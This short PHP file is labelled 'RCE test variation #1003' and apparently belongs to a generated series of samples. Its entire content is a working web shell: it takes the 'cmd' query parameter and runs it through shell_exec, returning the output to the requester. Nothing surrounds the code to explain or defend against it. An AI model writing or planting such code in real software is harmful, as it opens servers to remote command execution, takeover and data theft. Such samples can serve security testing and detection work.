<?php
// RCE test variation #1003
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>